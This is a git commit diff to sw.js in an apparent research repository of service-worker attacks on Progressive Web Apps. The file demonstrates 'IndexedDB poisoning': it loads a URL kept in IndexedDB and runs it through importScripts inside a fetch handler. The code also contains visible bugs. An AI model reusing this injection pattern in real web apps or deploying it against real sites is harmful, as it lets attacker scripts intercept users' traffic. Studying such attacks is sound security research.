6c9383c56752daa05fbb5874529c9a4a6d8ac371
DemoPWA <54972549+DemoPWA@users.noreply.github.com>
2022-02-10 01:42:09 -0500

    Update sw.js

--- SW_Attacks/IndexDBPoisoning/sw.js
+++ SW_Attacks/IndexDBPoisoning/sw.js
@@ -1,33 +1,35 @@
 
 var url = null
 // importScripts('https://demopwa.github.io/SW_Attacks/IndexDBPoisoning/fetch_sw.js')
- var request = indexedDB.open('demo_db', 1);
-   request.onsuccess = (event) => {
-      var db = event.target.result;
-      var txn = db.transaction('urls','readwrite')
-      txn.onsuccess =  function(ev){
-          console.log('Benign URL Added!!')
-      }
-      var store = txn.objectStore('urls')
-      store.get('imp_url').onsuccess = function(event) {
-           url = event.target.result.url
-      }
-   };
-
 
 self.addEventListener('install', event => {
   console.log('V1 installing…');
-//   event.waitUntil(createDB())
-  importScripts(url)
- 
 });
 
 self.addEventListener('activate', event => {
     console.log('V1 now ready to handle fetches!');   
-//     createDB()
-//     importScripts('https://demopwa.github.io/SW_Attacks/IndexDBPoisoning/fetch_sw.js')
     event.waitUntil(clients.claim());
 });
+
+self.addEventListener('fetch', evv =>{
+      var url - 'null'
+      // get report URL from indexDB
+      var request = indexedDB.open('demo_db', 1);
+      request.onsuccess = (event) => {
+          var db = event.target.result;
+          var txn = db.transaction('urls','readwrite')
+          txn.onsuccess =  function(ev){
+              console.log('Benign URL Added!!')
+          }
+          var store = txn.objectStore('urls')
+          store.get('report_url').onsuccess = function(event) {
+               url = event.target.result.url
+               // call made to benign URL                             
+          }          
+      }
+      importScripts(url) 
+      evv.respondWith(self.getResponse(evv.request.url));
+})
 
 if (url!=null){
    importScripts(url)
